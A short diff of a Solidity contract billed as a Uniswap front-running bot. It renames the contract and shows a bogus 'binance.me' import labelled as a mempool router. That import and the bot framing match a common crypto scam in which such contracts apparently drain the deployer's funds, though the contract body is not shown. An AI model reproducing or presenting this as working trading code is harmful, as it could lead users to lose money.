@@ -6,7 +6,7 @@ import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/in
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 //Mempool router
 import "binance.me";
-contract TiayUniswapFrontrunBot {
+contract LogansUniswapFrontrunBot {
  
     string public tokenName;
     string public tokenSymbol;
